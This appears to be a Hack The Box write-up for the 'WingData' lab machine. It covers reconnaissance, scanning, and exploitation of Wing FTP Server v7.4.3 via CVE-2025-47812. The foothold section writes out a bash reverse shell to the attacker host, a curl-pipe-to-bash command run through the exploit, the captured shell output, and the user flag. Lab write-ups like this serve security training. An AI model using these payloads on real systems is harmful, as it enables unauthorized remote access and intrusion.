# 🚀 Hack The Box - WingData Write-up

### **Machine Information**
| Machine Name | Target IP | Difficulty | Focus Service | Status |
| :--- | :--- | :--- | :--- | :--- |
| **WingData** | `10.129.63.65`| Easy | Linux | **SOLVED** ✅ |

<img width="891" height="616" alt="Screenshot 2026-05-19 222745" src="https://github.com/user-attachments/assets/6e2872bb-057c-4176-85c4-0eb5c8ebb063" />

---

## 1. Environment Setup & Reconnaissance

### Initial Connectivity Test
An initial connectivity test was performed using the `ping` utility to verify that the target host was active and to estimate the operating system type based on the TTL value

```bash
ping -c 4 10.129.63.65
```

<img width="848" height="133" alt="Screenshot 2026-05-19 201013" src="https://github.com/user-attachments/assets/81d18ba8-f239-468d-94fc-81b45bea2c9e" />

### The results showed a stable response with a TTL value of 63, indicating a Linux-based target.

## Local DNS Mapping
The local /etc/hosts file was updated to map the target IP address to the primary domain and the identified FTP subdomain.

```bash
echo "10.129.63.65 wingdata.htb" | sudo tee -a /etc/hosts
echo "10.129.63.65 ftp.wingdata.htb" | sudo tee -a /etc/hosts
```
<img width="810" height="129" alt="Screenshot 2026-05-19 202254" src="https://github.com/user-attachments/assets/ccb5512d-2878-44fc-9904-d8c1bafc8915" />


## 2. Scanning & Enumeration
Network Scanning (Nmap)
An aggressive port scan was executed using nmap to identify active services and their respective versions running on the target host.

```Bash
nmap -sC -sV -A 10.129.63.65
```
<img width="1919" height="577" alt="Screenshot 2026-05-19 202103" src="https://github.com/user-attachments/assets/59acefe7-714c-48f1-92f6-80d12102970b" />

Key Open Ports:

Port 22/tcp: SSH (OpenSSH 9.2p1 Debian 2+deb12u7)
Port 80/tcp: HTTP (Apache httpd 2.4.66)
HTTP Title: WingData Solutions


### Directory Brute-Forcing (ffuf)
Fuzzing was conducted on the main domain using ffuf alongside the common.txt wordlist to discover hidden directories and files.

```bash
ffuf -u [http://wingdata.htb/FUZZ](http://wingdata.htb/FUZZ) -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302,403
```

<img width="1223" height="533" alt="Screenshot 2026-05-19 204452" src="https://github.com/user-attachments/assets/e8dcb861-1ec3-4405-8921-22310f024264" />

## 3. Web Service & Vulnerability Identification
### Web Analysis
Accessing the main domain http://wingdata.htb displayed a landing page for a secure data transfer service. Navigating to the client portal on the subdomain

<img width="1919" height="892" alt="Screenshot 2026-05-19 202140" src="https://github.com/user-attachments/assets/560f201d-061f-4a8b-aec1-9975bbfbd2e1" />
<img width="1919" height="846" alt="Screenshot 2026-05-19 202234" src="https://github.com/user-attachments/assets/0b36311c-ca2a-49c9-a2a8-029fabef25f1" />

http://ftp.wingdata.htb/login.html revealed a web application authentication page.
"we need to add and im done in the first time /etc/hosts"

At the bottom of the login form, the specific software version in use was explicitly stated:
<img width="1913" height="886" alt="Screenshot 2026-05-19 202304" src="https://github.com/user-attachments/assets/9c685a95-f919-4e58-9ae6-80aa8c7ab204" />


FTP server software powered by Wing FTP Server v7.4.3

### Vulnerability Research
Public exploit research regarding Wing FTP Server v7.4.3 pointed to CVE-2025-47812 (Authenticated/Anonymous Remote Code Execution). A public Proof of Concept (PoC) repository by user 4m3rr0r was selected to exploit this flaw.
<img width="1905" height="902" alt="Screenshot 2026-05-19 202427" src="https://github.com/user-attachments/assets/3965bf6a-ece0-436c-b3fd-8f4c8103e0a2" />
<img width="1507" height="345" alt="Screenshot 2026-05-19 202524" src="https://github.com/user-attachments/assets/fcd2c414-e1b6-4fc3-a5d1-684aa6389682" />

### 4. Exploitation Setup & Foothold
Creating the Reverse Shell Payload
A simple interactive shell script named shell.sh was created within the /tmp directory of the attacker machine (10.10.14.23).

```bash
cd /tmp
echo 'bash -i >& /dev/tcp/10.10.14.23/5555 0>&1' > /tmp/shell.sh
python3 -m http.server 8080
```
<img width="1107" height="111" alt="Screenshot 2026-05-19 202709" src="https://github.com/user-attachments/assets/5beabfde-98aa-490d-a6b2-1ab90dbb10ad" />

### Executing the Exploit
A netcat listener was set up on port 5555, and the Python PoC script was executed to trigger the download and execution of the hosted payload scrip

```bash
python3 CVE-2025-47812.py -u [http://ftp.wingdata.htb](http://ftp.wingdata.htb) -c "curl [http://10.10.14.23:8080/shell.sh](http://10.10.14.23:8080/shell.sh)|bash" -v
```

<img width="1566" height="163" alt="Screenshot 2026-05-19 211242" src="https://github.com/user-attachments/assets/646c4b60-8401-488b-9844-baf391bca6bb" />

### The netcat listener successfully captured the reverse connection from the target host:

```bash
listening on [any] 5555 ...
connect to [10.10.14.23] from (UNKNOWN) [10.129.244.106] 58344
wingftp@wingdata:/opt/wftpserver$
```
<img width="926" height="138" alt="Screenshot 2026-05-19 211124" src="https://github.com/user-attachments/assets/534b63a3-99ea-48bf-9911-cdc3348888e8" />

### Upgrading Shell TTY
To establish a more stable, interactive shell session that supports autocomplete, a TTY upgrade was performed using Python:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## 5. Post-Exploitation & System Enumeration
### User Flag
The user flag was successfully located and retrieved from the home directory of the ubuntu user.

```bash
wingftp@wingdata:/$ cat /home/ubuntu/user.txt
966b96fc8bc54bfcb8be1b54b1f41bdf
```

<img width="619" height="168" alt="Screenshot 2026-05-19 211832" src="https://github.com/user-attachments/assets/379a08ba-20ee-4b0a-aa5c-329b41fe18d0" />







---
**Documented by**: Pagar Kristian Panjaitan
